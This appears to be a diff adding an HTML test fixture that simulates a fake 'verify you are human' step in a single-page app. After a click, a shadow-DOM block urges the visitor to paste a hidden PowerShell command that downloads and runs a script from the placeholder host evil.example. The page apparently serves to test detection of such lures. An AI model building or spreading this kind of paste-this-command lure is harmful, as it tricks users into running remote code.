@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SPA lazy verification</title>
+    <style>
+      body { font-family: Arial, sans-serif; margin: 40px; background: #111827; color: #f9fafb; }
+      button { padding: 12px 16px; border: 0; border-radius: 12px; background: #2563eb; color: white; }
+    </style>
+  </head>
+  <body>
+    <h1>Account verification</h1>
+    <p>This page simulates a route that lazy-loads a suspicious component.</p>
+    <button id="load">Load verification step</button>
+    <div id="mount"></div>
+    <script>
+      document.querySelector('#load').addEventListener('click', () => {
+        history.pushState({}, '', '/spa-lazy-shadow.html#verification');
+        setTimeout(() => {
+          const host = document.createElement('section');
+          host.id = 'shadow-verification-host';
+          const root = host.attachShadow({ mode: 'open' });
+          root.innerHTML = `
+            <style>pre{background:#020617;color:#f8fafc;padding:14px;border-radius:10px;white-space:pre-wrap}</style>
+            <h2>Verify you are human</h2>
+            <p>Open PowerShell, copy and paste the command, then press Enter.</p>
+            <button data-payload="powershell -w hidden -c irm https://evil.example/a.ps1 | iex">Copy now</button>
+            <pre>powershell -w hidden -c "irm https://evil.example/a.ps1 | iex"</pre>`;
+          document.querySelector('#mount').append(host);
+        }, 500);
+      });
+    </script>
+  </body>
+</html>
